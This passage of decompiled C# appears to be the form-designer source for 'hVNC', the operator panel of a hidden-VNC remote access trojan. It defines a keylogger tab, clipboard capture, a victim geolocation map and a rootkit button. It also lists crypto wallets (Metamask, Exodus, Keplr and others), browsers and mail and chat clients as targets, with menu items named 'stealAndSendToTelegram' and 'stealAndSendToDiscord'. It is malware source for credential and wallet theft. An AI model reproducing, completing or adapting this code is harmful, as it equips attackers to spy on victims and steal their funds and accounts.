            this.label28.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label28.Location = new System.Drawing.Point(610, 371);
            this.label28.Name = "label28";
            this.label28.Size = new System.Drawing.Size(50, 12);
            this.label28.TabIndex = 139;
            this.label28.Text = "Phantom";
            // 
            // label22
            // 
            this.label22.AutoSize = true;
            this.label22.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label22.Location = new System.Drawing.Point(610, 245);
            this.label22.Name = "label22";
            this.label22.Size = new System.Drawing.Size(32, 12);
            this.label22.TabIndex = 133;
            this.label22.Text = "Slope";
            // 
            // label19
            // 
            this.label19.AutoSize = true;
            this.label19.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label19.Location = new System.Drawing.Point(785, 371);
            this.label19.Name = "label19";
            this.label19.Size = new System.Drawing.Size(23, 12);
            this.label19.TabIndex = 127;
            this.label19.Text = "Ton";
            // 
            // label20
            // 
            this.label20.AutoSize = true;
            this.label20.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label20.Location = new System.Drawing.Point(439, 182);
            this.label20.Name = "label20";
            this.label20.Size = new System.Drawing.Size(35, 12);
            this.label20.TabIndex = 129;
            this.label20.Text = "Finnie";
            // 
            // label21
            // 
            this.label21.AutoSize = true;
            this.label21.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label21.Location = new System.Drawing.Point(439, 309);
            this.label21.Name = "label21";
            this.label21.Size = new System.Drawing.Size(40, 12);
            this.label21.TabIndex = 131;
            this.label21.Text = "XinPay";
            // 
            // label16
            // 
            this.label16.AutoSize = true;
            this.label16.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label16.Location = new System.Drawing.Point(610, 182);
            this.label16.Name = "label16";
            this.label16.Size = new System.Drawing.Size(34, 12);
            this.label16.TabIndex = 121;
            this.label16.Text = "Sollet";
            // 
            // label17
            // 
            this.label17.AutoSize = true;
            this.label17.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label17.Location = new System.Drawing.Point(250, 371);
            this.label17.Name = "label17";
            this.label17.Size = new System.Drawing.Size(56, 12);
            this.label17.TabIndex = 123;
            this.label17.Text = "Metamask";
            // 
            // label13
            // 
            this.label13.AutoSize = true;
            this.label13.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label13.Location = new System.Drawing.Point(946, 182);
            this.label13.Name = "label13";
            this.label13.Size = new System.Drawing.Size(31, 12);
            this.label13.TabIndex = 115;
            this.label13.Text = "Keplr";
            // 
            // label14
            // 
            this.label14.AutoSize = true;
            this.label14.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label14.Location = new System.Drawing.Point(94, 309);
            this.label14.Name = "label14";
            this.label14.Size = new System.Drawing.Size(37, 12);
            this.label14.TabIndex = 117;
            this.label14.Text = "Swash";
            // 
            // label15
            // 
            this.label15.AutoSize = true;
            this.label15.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label15.Location = new System.Drawing.Point(610, 309);
            this.label15.Name = "label15";
            this.label15.Size = new System.Drawing.Size(46, 12);
            this.label15.TabIndex = 119;
            this.label15.Text = "Starcoin";
            // 
            // label10
            // 
            this.label10.AutoSize = true;
            this.label10.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label10.Location = new System.Drawing.Point(785, 121);
            this.label10.Name = "label10";
            this.label10.Size = new System.Drawing.Size(44, 12);
            this.label10.TabIndex = 109;
            this.label10.Text = "Coinomi";
            // 
            // label11
            // 
            this.label11.AutoSize = true;
            this.label11.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label11.Location = new System.Drawing.Point(94, 182);
            this.label11.Name = "label11";
            this.label11.Size = new System.Drawing.Size(49, 12);
            this.label11.TabIndex = 111;
            this.label11.Text = "Liquality";
            // 
            // label12
            // 
            this.label12.AutoSize = true;
            this.label12.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label12.Location = new System.Drawing.Point(94, 371);
            this.label12.Name = "label12";
            this.label12.Size = new System.Drawing.Size(31, 12);
            this.label12.TabIndex = 113;
            this.label12.Text = "Nifty";
            // 
            // label9
            // 
            this.label9.AutoSize = true;
            this.label9.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label9.Location = new System.Drawing.Point(946, 245);
            this.label9.Name = "label9";
            this.label9.Size = new System.Drawing.Size(46, 12);
            this.label9.TabIndex = 107;
            this.label9.Text = "Crocobit";
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label5.Location = new System.Drawing.Point(250, 121);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(28, 12);
            this.label5.TabIndex = 99;
            this.label5.Text = "Jaxx";
            // 
            // label6
            // 
            this.label6.AutoSize = true;
            this.label6.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label6.Location = new System.Drawing.Point(439, 121);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(40, 12);
            this.label6.TabIndex = 101;
            this.label6.Text = "Exodus";
            // 
            // label8
            // 
            this.label8.AutoSize = true;
            this.label8.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label8.Location = new System.Drawing.Point(946, 309);
            this.label8.Name = "label8";
            this.label8.Size = new System.Drawing.Size(43, 12);
            this.label8.TabIndex = 105;
            this.label8.Text = "Oxygen";
            // 
            // label7
            // 
            this.label7.AutoSize = true;
            this.label7.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label7.Location = new System.Drawing.Point(946, 371);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(40, 12);
            this.label7.TabIndex = 103;
            this.label7.Text = "Guarda";
            // 
            // tabPage3
            // 
            this.tabPage3.BackColor = System.Drawing.Color.White;
            this.tabPage3.Controls.Add(this.txtKeyl);
            this.tabPage3.Location = new System.Drawing.Point(4, 28);
            this.tabPage3.Name = "tabPage3";
            this.tabPage3.Size = new System.Drawing.Size(1063, 624);
            this.tabPage3.TabIndex = 2;
            this.tabPage3.Text = "Keylogger";
            // 
            // txtKeyl
            // 
            this.txtKeyl.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(53)))), ((int)(((byte)(73)))), ((int)(((byte)(103)))));
            this.txtKeyl.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.txtKeyl.Dock = System.Windows.Forms.DockStyle.Fill;
            this.txtKeyl.ForeColor = System.Drawing.Color.WhiteSmoke;
            this.txtKeyl.Location = new System.Drawing.Point(0, 0);
            this.txtKeyl.Name = "txtKeyl";
            this.txtKeyl.Size = new System.Drawing.Size(1063, 624);
            this.txtKeyl.TabIndex = 91;
            this.txtKeyl.Text = "";
            this.txtKeyl.TextChanged += new System.EventHandler(this.txtKeyl_TextChanged);
            // 
            // tabPage4
            // 
            this.tabPage4.BackColor = System.Drawing.Color.White;
            this.tabPage4.Controls.Add(this.txtClip);
            this.tabPage4.Location = new System.Drawing.Point(4, 28);
            this.tabPage4.Name = "tabPage4";
            this.tabPage4.Size = new System.Drawing.Size(1063, 624);
            this.tabPage4.TabIndex = 3;
            this.tabPage4.Text = "Clipboard";
            // 
            // txtClip
            // 
            this.txtClip.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(53)))), ((int)(((byte)(73)))), ((int)(((byte)(103)))));
            this.txtClip.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.txtClip.Dock = System.Windows.Forms.DockStyle.Fill;
            this.txtClip.ForeColor = System.Drawing.Color.WhiteSmoke;
            this.txtClip.Location = new System.Drawing.Point(0, 0);
            this.txtClip.Name = "txtClip";
            this.txtClip.Size = new System.Drawing.Size(1063, 624);
            this.txtClip.TabIndex = 90;
            this.txtClip.Text = "";
            this.txtClip.TextChanged += new System.EventHandler(this.txtClip_TextChanged);
            // 
            // tabPage5
            // 
            this.tabPage5.BackColor = System.Drawing.Color.White;
            this.tabPage5.Controls.Add(this.studioButton13);
            this.tabPage5.Controls.Add(this.label31);
            this.tabPage5.Controls.Add(this.label25);
            this.tabPage5.Controls.Add(this.txtlongitude);
            this.tabPage5.Controls.Add(this.txtlatitude);
            this.tabPage5.Controls.Add(this.map);
            this.tabPage5.Location = new System.Drawing.Point(4, 28);
            this.tabPage5.Name = "tabPage5";
            this.tabPage5.Size = new System.Drawing.Size(1063, 624);
            this.tabPage5.TabIndex = 4;
            this.tabPage5.Text = "Geo Map";
            // 
            // studioButton13
            // 
            this.studioButton13.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.studioButton13.Location = new System.Drawing.Point(934, 20);
            this.studioButton13.Name = "studioButton13";
            this.studioButton13.Size = new System.Drawing.Size(115, 23);
            this.studioButton13.TabIndex = 76;
            this.studioButton13.Text = "Get Location";
            this.studioButton13.UseVisualStyleBackColor = true;
            this.studioButton13.Click += new System.EventHandler(this.studioButton13_Click);
            // 
            // label31
            // 
            this.label31.AutoSize = true;
            this.label31.Location = new System.Drawing.Point(189, 25);
            this.label31.Name = "label31";
            this.label31.Size = new System.Drawing.Size(64, 13);
            this.label31.TabIndex = 16;
            this.label31.Text = "longitude:";
            // 
            // label25
            // 
            this.label25.AutoSize = true;
            this.label25.Location = new System.Drawing.Point(15, 25);
            this.label25.Name = "label25";
            this.label25.Size = new System.Drawing.Size(54, 13);
            this.label25.TabIndex = 15;
            this.label25.Text = "latitude:";
            // 
            // txtlongitude
            // 
            this.txtlongitude.Location = new System.Drawing.Point(263, 21);
            this.txtlongitude.Name = "txtlongitude";
            this.txtlongitude.Size = new System.Drawing.Size(100, 20);
            this.txtlongitude.TabIndex = 14;
            // 
            // txtlatitude
            // 
            this.txtlatitude.Location = new System.Drawing.Point(79, 21);
            this.txtlatitude.Name = "txtlatitude";
            this.txtlatitude.Size = new System.Drawing.Size(100, 20);
            this.txtlatitude.TabIndex = 13;
            // 
            // map
            // 
            this.map.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.map.BackColor = System.Drawing.Color.DimGray;
            this.map.Bearing = 0F;
            this.map.CanDragMap = true;
            this.map.ContextMenuStrip = this.contextMenuStrip1;
            this.map.EmptyTileColor = System.Drawing.Color.Navy;
            this.map.GrayScaleMode = false;
            this.map.HelperLineOption = GMap.NET.WindowsForms.HelperLineOptions.DontShow;
            this.map.LevelsKeepInMemory = 5;
            this.map.Location = new System.Drawing.Point(0, 57);
            this.map.MarkersEnabled = true;
            this.map.MaxZoom = 16;
            this.map.MinZoom = 0;
            this.map.MouseWheelZoomEnabled = true;
            this.map.MouseWheelZoomType = GMap.NET.MouseWheelZoomType.MousePositionAndCenter;
            this.map.Name = "map";
            this.map.NegativeMode = false;
            this.map.PolygonsEnabled = true;
            this.map.RetryLoadTile = 0;
            this.map.RoutesEnabled = true;
            this.map.ScaleMode = GMap.NET.WindowsForms.ScaleModes.Integer;
            this.map.SelectedAreaFillColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(65)))), ((int)(((byte)(105)))), ((int)(((byte)(225)))));
            this.map.ShowTileGridLines = false;
            this.map.Size = new System.Drawing.Size(1070, 567);
            this.map.TabIndex = 12;
            this.map.Zoom = 5D;
            // 
            // button3
            // 
            this.button3.Location = new System.Drawing.Point(959, 613);
            this.button3.Name = "button3";
            this.button3.Size = new System.Drawing.Size(92, 23);
            this.button3.TabIndex = 85;
            // 
            // btnClip
            // 
            this.btnClip.Location = new System.Drawing.Point(959, 551);
            this.btnClip.Name = "btnClip";
            this.btnClip.Size = new System.Drawing.Size(94, 25);
            this.btnClip.TabIndex = 95;
            this.btnClip.Text = "Get Clip";
            this.btnClip.UseVisualStyleBackColor = true;
            this.btnClip.Click += new System.EventHandler(this.btnClip_Click);
            // 
            // studioButton12
            // 
            this.studioButton12.Location = new System.Drawing.Point(959, 582);
            this.studioButton12.Name = "studioButton12";
            this.studioButton12.Size = new System.Drawing.Size(94, 25);
            this.studioButton12.TabIndex = 92;
            this.studioButton12.Text = "Get Logs";
            this.studioButton12.UseVisualStyleBackColor = true;
            this.studioButton12.Click += new System.EventHandler(this.studioButton12_Click);
            // 
            // ShowStart
            // 
            this.ShowStart.Location = new System.Drawing.Point(869, 499);
            this.ShowStart.Name = "ShowStart";
            this.ShowStart.Size = new System.Drawing.Size(40, 40);
            this.ShowStart.TabIndex = 2;
            this.ShowStart.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.ShowStart.UseVisualStyleBackColor = true;
            this.ShowStart.Click += new System.EventHandler(this.ShowStart_Click);
            // 
            // groupBox6
            // 
            this.groupBox6.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.groupBox6.ContextMenuStrip = this.contextMenuStrip1;
            this.groupBox6.Controls.Add(this.IntervalScroll);
            this.groupBox6.Controls.Add(this.QualityLabel);
            this.groupBox6.Controls.Add(this.IntervalLabel);
            this.groupBox6.Controls.Add(this.QualityScroll);
            this.groupBox6.Location = new System.Drawing.Point(845, 545);
            this.groupBox6.Name = "groupBox6";
            this.groupBox6.Size = new System.Drawing.Size(102, 96);
            this.groupBox6.TabIndex = 31;
            this.groupBox6.TabStop = false;
            this.groupBox6.Visible = false;
            // 
            // IntervalScroll
            // 
            this.IntervalScroll.AutoSize = false;
            this.IntervalScroll.Location = new System.Drawing.Point(119, 19);
            this.IntervalScroll.Maximum = 1000;
            this.IntervalScroll.Minimum = 10;
            this.IntervalScroll.Name = "IntervalScroll";
            this.IntervalScroll.Size = new System.Drawing.Size(104, 26);
            this.IntervalScroll.TabIndex = 8;
            this.IntervalScroll.TickStyle = System.Windows.Forms.TickStyle.None;
            this.IntervalScroll.Value = 500;
            this.IntervalScroll.Scroll += new System.EventHandler(this.IntervalScroll_Scroll);
            // 
            // QualityLabel
            // 
            this.QualityLabel.AutoSize = true;
            this.QualityLabel.Location = new System.Drawing.Point(213, 18);
            this.QualityLabel.Name = "QualityLabel";
            this.QualityLabel.Size = new System.Drawing.Size(93, 13);
            this.QualityLabel.TabIndex = 5;
            this.QualityLabel.Text = "Quality : 100%";
            // 
            // IntervalLabel
            // 
            this.IntervalLabel.AutoSize = true;
            this.IntervalLabel.Location = new System.Drawing.Point(9, 18);
            this.IntervalLabel.Name = "IntervalLabel";
            this.IntervalLabel.Size = new System.Drawing.Size(113, 13);
            this.IntervalLabel.TabIndex = 6;
            this.IntervalLabel.Text = "Interval (ms): 500";
            // 
            // QualityScroll
            // 
            this.QualityScroll.AutoSize = false;
            this.QualityScroll.Location = new System.Drawing.Point(312, 17);
            this.QualityScroll.Maximum = 100;
            this.QualityScroll.Name = "QualityScroll";
            this.QualityScroll.Size = new System.Drawing.Size(104, 26);
            this.QualityScroll.TabIndex = 9;
            this.QualityScroll.TickStyle = System.Windows.Forms.TickStyle.None;
            this.QualityScroll.Value = 100;
            this.QualityScroll.Scroll += new System.EventHandler(this.QualityScroll_Scroll);
            // 
            // btnInfo
            // 
            this.btnInfo.Location = new System.Drawing.Point(958, 524);
            this.btnInfo.Name = "btnInfo";
            this.btnInfo.Size = new System.Drawing.Size(94, 25);
            this.btnInfo.TabIndex = 110;
            this.btnInfo.Text = "Get Info";
            this.btnInfo.UseVisualStyleBackColor = true;
            this.btnInfo.Click += new System.EventHandler(this.btnInfo_Click);
            // 
            // statusStrip1
            // 
            this.statusStrip1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.statusStrip1.BackColor = System.Drawing.Color.White;
            this.statusStrip1.Dock = System.Windows.Forms.DockStyle.None;
            this.statusStrip1.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.statusStrip1.GripStyle = System.Windows.Forms.ToolStripGripStyle.Visible;
            this.statusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripStatusLabel3,
            this.PingStatusLabel});
            this.statusStrip1.Location = new System.Drawing.Point(18, 693);
            this.statusStrip1.Name = "statusStrip1";
            this.statusStrip1.Size = new System.Drawing.Size(73, 22);
            this.statusStrip1.SizingGrip = false;
            this.statusStrip1.TabIndex = 19;
            // 
            // toolStripStatusLabel3
            // 
            this.toolStripStatusLabel3.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.toolStripStatusLabel3.ForeColor = System.Drawing.Color.Black;
            this.toolStripStatusLabel3.Name = "toolStripStatusLabel3";
            this.toolStripStatusLabel3.Size = new System.Drawing.Size(47, 17);
            this.toolStripStatusLabel3.Text = "Status";
            // 
            // PingStatusLabel
            // 
            this.PingStatusLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.PingStatusLabel.ForeColor = System.Drawing.Color.SteelBlue;
            this.PingStatusLabel.Name = "PingStatusLabel";
            this.PingStatusLabel.Size = new System.Drawing.Size(71, 17);
            this.PingStatusLabel.Text = "Ping: 0ms";
            this.PingStatusLabel.Visible = false;
            // 
            // hVNC
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(1208, 729);
            this.Controls.Add(this.primeTheme1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.MinimizeBox = false;
            this.MinimumSize = new System.Drawing.Size(1208, 729);
            this.Name = "hVNC";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.TransparencyKey = System.Drawing.Color.Fuchsia;
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.VNCForm_FormClosing);
            this.Load += new System.EventHandler(this.VNCForm_Load);
            this.Click += new System.EventHandler(this.VNCForm_Click);
            this.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.VNCForm_KeyPress);
            this.contextMenuStrip1.ResumeLayout(false);
            this.contextMenuStrip2.ResumeLayout(false);
            this.contextMenuStrip3.ResumeLayout(false);
            this.contextMenuStrip4.ResumeLayout(false);
            this.contextMenuStrip5.ResumeLayout(false);
            this.contextMenuStrip6.ResumeLayout(false);
            this.contextMenuStrip7.ResumeLayout(false);
            this.FileManagerContextMenuStrip.ResumeLayout(false);
            this.primeTheme1.ResumeLayout(false);
            this.primeTheme1.PerformLayout();
            this.panel1.ResumeLayout(false);
            this.panel1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.ResizeScroll)).EndInit();
            this.ambianceTabControl1.ResumeLayout(false);
            this.tabPage1.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.VNCBox)).EndInit();
            this.tabPage2.ResumeLayout(false);
            this.tabPage2.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox31)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox30)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox29)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox28)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox27)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox26)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox25)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox24)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox23)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox22)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox21)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox20)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox19)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox18)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox17)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox16)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox15)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox14)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox13)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox12)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox9)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox10)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox11)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox6)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox7)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox5)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox4)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox3)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox2)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox1)).EndInit();
            this.tabPage3.ResumeLayout(false);
            this.tabPage4.ResumeLayout(false);
            this.tabPage5.ResumeLayout(false);
            this.tabPage5.PerformLayout();
            this.groupBox6.ResumeLayout(false);
            this.groupBox6.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.IntervalScroll)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.QualityScroll)).EndInit();
            this.statusStrip1.ResumeLayout(false);
            this.statusStrip1.PerformLayout();
            this.ResumeLayout(false);

        }

        // Token: 0x04000538 RID: 1336

        // Token: 0x04000539 RID: 1337
        private Timer timer1;

        // Token: 0x0400053A RID: 1338
        private ToolStripStatusLabel toolStripStatusLabel1;

        // Token: 0x0400053B RID: 1339
        private ToolStripStatusLabel toolStripStatusLabel2;

        // Token: 0x0400053C RID: 1340
        private Timer timer2;

        // Token: 0x0400053D RID: 1341
        private ContextMenuStrip contextMenuStrip1;

        // Token: 0x0400053E RID: 1342
        private ToolStripMenuItem closeToolStripMenuItem;

        // Token: 0x0400053F RID: 1343
        private Label label3;

        // Token: 0x04000540 RID: 1344
        private PictureBox VNCBox;

        // Token: 0x04000541 RID: 1345
        private GroupBox groupBox6;

        // Token: 0x04000542 RID: 1346
        private TrackBar IntervalScroll;

        // Token: 0x04000543 RID: 1347
        private Label ResizeLabel;

        // Token: 0x04000544 RID: 1348
        private Label QualityLabel;

        // Token: 0x04000545 RID: 1349
        private Label IntervalLabel;

        // Token: 0x04000546 RID: 1350
        private Button MinBtn;

        // Token: 0x04000547 RID: 1351
        private TrackBar QualityScroll;

        // Token: 0x04000548 RID: 1352
        private Button RestoreMaxBtn;

        // Token: 0x04000549 RID: 1353
        private TrackBar ResizeScroll;

        // Token: 0x0400054A RID: 1354
        private Button CloseBtn;

        // Token: 0x0400054B RID: 1355
        private Button ShowStart;

        // Token: 0x0400054C RID: 1356
        private Button button3;

        // Token: 0x0400054D RID: 1357
        private StudioButton studioButton3;

        // Token: 0x0400054E RID: 1358
        private StudioButton studioButton4;

        // Token: 0x0400054F RID: 1359
        private StudioButton studioButton5;

        // Token: 0x04000551 RID: 1361
        private PrimeTheme primeTheme1;

        // Token: 0x04000552 RID: 1362
        private StudioButton studioButton1;

        // Token: 0x04000553 RID: 1363
        private JCS.ToggleSwitch chkClone;

        // Token: 0x04000554 RID: 1364
        private Label label1;

        // Token: 0x04000555 RID: 1365
        private StudioButton btnWatcher;

        // Token: 0x04000556 RID: 1366
        private StudioButton btnRootkit;

        // Token: 0x04000557 RID: 1367
        private StudioButton btnElectrum;

        // Token: 0x04000558 RID: 1368
        private StudioButton studioButton2;

        // Token: 0x04000559 RID: 1369
        private StudioButton studioButton6;

        // Token: 0x0400055A RID: 1370
        private ContextMenuStrip contextMenuStrip2;

        // Token: 0x0400055B RID: 1371
        private ToolStripMenuItem electrumToolStripMenuItem;

        // Token: 0x0400055C RID: 1372
        private ToolStripMenuItem armoryToolStripMenuItem;

        // Token: 0x0400055D RID: 1373
        private ToolStripMenuItem GuardaItem;

        // Token: 0x0400055E RID: 1374
        private ToolStripMenuItem coinomiToolStripMenuItem;

        // Token: 0x0400055F RID: 1375
        private ToolStripMenuItem exodusToolStripMenuItem;

        // Token: 0x04000560 RID: 1376
        private ToolStripMenuItem atomicToolStripMenuItem;

        // Token: 0x04000561 RID: 1377
        private ToolStripMenuItem jaxxToolStripMenuItem;

        // Token: 0x04000562 RID: 1378
        private ContextMenuStrip contextMenuStrip3;

        // Token: 0x04000563 RID: 1379
        private ToolStripMenuItem outlookToolStripMenuItem;

        // Token: 0x04000564 RID: 1380
        private ToolStripMenuItem foxmailToolStripMenuItem;

        // Token: 0x04000565 RID: 1381
        private ToolStripMenuItem thunderbirdToolStripMenuItem;

        // Token: 0x04000566 RID: 1382
        private ToolStripMenuItem skypeToolStripMenuItem;

        // Token: 0x04000567 RID: 1383
        private ToolStripMenuItem discordToolStripMenuItem;

        // Token: 0x04000568 RID: 1384
        private ToolStripMenuItem telegramToolStripMenuItem;

        // Token: 0x04000569 RID: 1385
        private ContextMenuStrip contextMenuStrip4;

        // Token: 0x0400056A RID: 1386
        private ToolStripMenuItem btnChrome;

        // Token: 0x0400056B RID: 1387
        private ToolStripMenuItem btnEdge;

        // Token: 0x0400056C RID: 1388
        private ToolStripMenuItem btnFirefox;

        // Token: 0x0400056D RID: 1389
        private ToolStripMenuItem btnBrave;

        // Token: 0x0400056E RID: 1390
        private ToolStripMenuItem btnEpic;

        // Token: 0x0400056F RID: 1391
        private ToolStripMenuItem btnVivaldi;

        // Token: 0x04000570 RID: 1392
        private ToolStripMenuItem btn360;

        // Token: 0x04000571 RID: 1393
        private ToolStripMenuItem btnSputnik;

        // Token: 0x04000572 RID: 1394
        private StudioButton studioButton7;

        // Token: 0x04000573 RID: 1395
        private StudioButton studioButton9;

        // Token: 0x04000574 RID: 1396
        private ContextMenuStrip contextMenuStrip5;

        // Token: 0x04000575 RID: 1397
        private ToolStripMenuItem msinfo32exeToolStripMenuItem;

        // Token: 0x04000576 RID: 1398
        private ToolStripMenuItem mstscexeToolStripMenuItem;

        // Token: 0x04000577 RID: 1399
        private Timer timer3;

        // Token: 0x04000578 RID: 1400
        private ToolStripMenuItem notepadToolStripMenuItem;

        // Token: 0x04000579 RID: 1401
        private ToolStripMenuItem controlPanelToolStripMenuItem;

        // Token: 0x0400057A RID: 1402
        private StudioButton studioButton8;

        // Token: 0x0400057B RID: 1403
        private StudioButton studioButton10;

        // Token: 0x0400057C RID: 1404
        private ContextMenuStrip contextMenuStrip6;

        // Token: 0x0400057D RID: 1405
        private ToolStripMenuItem stealAndSendToTelegramToolStripMenuItem;

        // Token: 0x0400057E RID: 1406
        private ToolStripMenuItem stealAndSendToDiscordToolStripMenuItem;

        // Token: 0x0400057F RID: 1407
        private ToolStripMenuItem comodoToolStripMenuItem;

        // Token: 0x04000580 RID: 1408
        private ToolStripMenuItem yandexToolStripMenuItem;

        // Token: 0x04000581 RID: 1409
        private ToolStripMenuItem operaNeonToolStripMenuItem;

        // Token: 0x04000582 RID: 1410
        private ToolStripMenuItem waterFoxToolStripMenuItem;

        // Token: 0x04000583 RID: 1411
        private ToolStripMenuItem orbitumToolStripMenuItem;

        // Token: 0x04000584 RID: 1412
        private ToolStripMenuItem atomToolStripMenuItem;

        // Token: 0x04000585 RID: 1413
        private ToolStripMenuItem slimjetToolStripMenuItem;

        // Token: 0x04000586 RID: 1414
